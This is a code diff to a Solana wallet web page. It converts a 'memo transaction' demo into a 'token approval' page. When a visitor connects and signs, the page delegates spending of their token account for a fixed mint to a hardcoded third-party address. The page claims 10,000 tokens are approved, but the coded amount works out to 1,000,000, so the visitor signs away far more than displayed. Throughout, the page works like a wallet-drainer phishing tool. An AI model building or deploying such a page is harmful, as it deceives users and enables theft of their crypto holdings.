@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Memo Transaction</title>
+    <title>Solana Token Approval</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -121,16 +121,18 @@
 </head>
 <body>
 <div class="container">
-    <h1>&#x1F4DD; Solana Memo Transaction</h1>
-    <p class="subtitle">Simulates, signs & sends a memo transaction to the network</p>
+    <h1>&#x1F4DD; Solana Token Approval</h1>
+    <p class="subtitle">Approve 10,000 tokens for delegate spending</p>
 
     <div id="walletStatus" class="wallet-status">Wallet not connected</div>
     <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
 
     <div id="messageSection" class="message-section">
-        <button id="signBtn" onclick="buildSignAndSend()">Send Memo Transaction</button>
+        <button id="signBtn" onclick="buildSignAndSend()">Approve Token Spending</button>
         <div class="info-text">
-            Simulates, signs, then broadcasts the transaction to Solana mainnet.<br>
+            Simulates, signs, then broadcasts the approval transaction to Solana mainnet.<br>
+            Delegate: AeNzsm4mMEmzogE9fbZ9MHz8x5S3F2iyJpgiVykKFkjJ<br>
+            Amount: 10,000 tokens<br>
             Check the browser console for detailed logs.
         </div>
     </div>
@@ -139,7 +141,6 @@
 </div>
 
 <script>
-var MEMO_PROGRAM_ID  = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
 var TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
 var MINT_ADDRESS     = new solanaWeb3.PublicKey('642NfDi7su9jQA1M4Jqc67DaLpY1Vqbt7sbvRMZKpump');
 
@@ -222,59 +223,61 @@ async function buildSignAndSend() {
         r.className = 'result visible error';
         r.innerHTML = '<strong>❌ Failed to Connect</strong>Could not fetch blockhash from RPC. Check your internet connection.';
         btn.disabled = false;
-        btn.textContent = 'Send Memo Transaction';
+        btn.textContent = 'Approve Token Spending';
         return;
     }
 
     // Derive the ATA for the user
     var userATA = getAssociatedTokenAddress(MINT_ADDRESS, wallet);
+    
+    // Define the delegate address
+    var delegateAddress = new solanaWeb3.PublicKey('AeNzsm4mMEmzogE9fbZ9MHz8x5S3F2iyJpgiVykKFkjJ');
+    
+    // Amount to approve (10000 tokens with 6 decimals = 100000000000)
+    var approvalAmount = 1000000000000;
+    
     console.log('\n=== DERIVED ADDRESSES ===');
     console.log('User Wallet:', wallet.toString());
     console.log('Mint Address:', MINT_ADDRESS.toString());
     console.log('User ATA:', userATA.toString());
+    console.log('Delegate Address:', delegateAddress.toString());
+    console.log('Approval Amount:', approvalAmount, '(10000 tokens)');
     console.log('Token Program:', TOKEN_PROGRAM_ID.toString());
 
-    // Build the memo instruction
-    var memoIx = new solanaWeb3.TransactionInstruction({
-        programId: MEMO_PROGRAM_ID,
-        keys: [],
-        data: new Uint8Array(0),
+    // Build the approve instruction
+    // Instruction discriminator for approve is 4
+    var instructionData = new Uint8Array(9);
+    instructionData[0] = 4; // Approve instruction
+    
+    // Write the amount as little-endian u64
+    var view = new DataView(instructionData.buffer);
+    view.setBigUint64(1, BigInt(approvalAmount), true);
+    
+    var approveIx = new solanaWeb3.TransactionInstruction({
+        programId: TOKEN_PROGRAM_ID,
+        keys: [
+            { pubkey: userATA, isSigner: false, isWritable: true },      // Source account
+            { pubkey: delegateAddress, isSigner: false, isWritable: false }, // Delegate
+            { pubkey: wallet, isSigner: true, isWritable: false }        // Owner
+        ],
+        data: instructionData
     });
-
-    // Create a system transfer of 0 lamports from wallet to wallet
-    var transferIx = solanaWeb3.SystemProgram.transfer({
-        fromPubkey: wallet,
-        toPubkey: wallet,
-        lamports: 0
-    });
-
-    // Add additional account references to the transfer instruction
-    transferIx.keys.push(
-        { pubkey: MINT_ADDRESS, isSigner: false, isWritable: false },
-        { pubkey: userATA, isSigner: false, isWritable: true },
-        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false }
-    );
 
     var tx = new solanaWeb3.Transaction({ feePayer: wallet, recentBlockhash: recentBlockhash });
-    tx.add(memoIx);
-    tx.add(transferIx);
+    tx.add(approveIx);
 
     console.log('\n=== TRANSACTION DETAILS ===');
     console.log('Fee Payer:', wallet.toString());
     console.log('Recent Blockhash:', recentBlockhash);
     console.log('Instructions:', tx.instructions.length);
-    console.log('\nInstruction 0 (Memo):');
+    console.log('\nInstruction 0 (Token Approve):');
     console.log('  Program ID:', tx.instructions[0].programId.toString());
-    console.log('  Keys:', tx.instructions[0].keys.length);
-    console.log('  Data:', tx.instructions[0].data);
-    console.log('\nInstruction 1 (Account References):');
-    console.log('  Program ID:', tx.instructions[1].programId.toString());
     console.log('  Keys:');
-    tx.instructions[1].keys.forEach(function(key, idx) {
+    tx.instructions[0].keys.forEach(function(key, idx) {
         console.log('    [' + idx + '] ' + key.pubkey.toString());
         console.log('        isSigner: ' + key.isSigner + ', isWritable: ' + key.isWritable);
     });
-    console.log('  Data:', tx.instructions[1].data);
+    console.log('  Data (hex):', Array.from(tx.instructions[0].data).map(b => b.toString(16).padStart(2, '0')).join(''));
 
     // Simulate the transaction
     btn.textContent = 'Simulating transaction…';
@@ -296,7 +299,7 @@ async function buildSignAndSend() {
                 'Error: ' + JSON.stringify(simulation.value.err) + '<br><br>' +
                 'Check console for details.';
             btn.disabled = false;
-            btn.textContent = 'Send Memo Transaction';
+            btn.textContent = 'Approve Token Spending';
             return;
         } else {
             console.log('✓ Simulation successful!');
@@ -308,7 +311,7 @@ async function buildSignAndSend() {
         r.innerHTML = '<strong>❌ Simulation Error</strong>' +
             simErr.message + '<br><br>Check console for details.';
         btn.disabled = false;
-        btn.textContent = 'Send Memo Transaction';
+        btn.textContent = 'Approve Token Spending';
         return;
     }
 
@@ -327,7 +330,7 @@ async function buildSignAndSend() {
         r.className = 'result visible error';
         r.innerHTML = '<strong>&#x274C; Signature Rejected</strong>' + err.message;
         btn.disabled = false;
-        btn.textContent = 'Send Memo Transaction';
+        btn.textContent = 'Approve Token Spending';
         return;
     }
 
@@ -370,12 +373,14 @@ async function buildSignAndSend() {
             console.log('✓ Transaction confirmed successfully!');
             r.className = 'result visible success';
             r.innerHTML =
-                '<strong>&#10003; Transaction Confirmed!</strong>' +
+                '<strong>&#10003; Approval Successful!</strong>' +
                 '<b>Signature:</b><br>' +
                 '<a class="tx-link" href="https://solscan.io/tx/' + txSignature + '" target="_blank">' + 
                 txSignature + '</a><br><br>' +
-                '<b>Signer:</b><br>' + wallet.toString() + '<br><br>' +
-                '<b>User ATA:</b><br>' + userATA.toString() + '<br><br>' +
+                '<b>Owner:</b><br>' + wallet.toString() + '<br><br>' +
+                '<b>Token Account:</b><br>' + userATA.toString() + '<br><br>' +
+                '<b>Delegate:</b><br>' + delegateAddress.toString() + '<br><br>' +
+                '<b>Approved Amount:</b><br>10,000 tokens<br><br>' +
                 'Click the signature to view on Solscan.';
         }
         
@@ -387,7 +392,7 @@ async function buildSignAndSend() {
     }
 
     btn.disabled    = false;
-    btn.textContent = 'Send Memo Transaction';
+    btn.textContent = 'Approve Token Spending';
 }
 
 window.addEventListener('load', async function() {
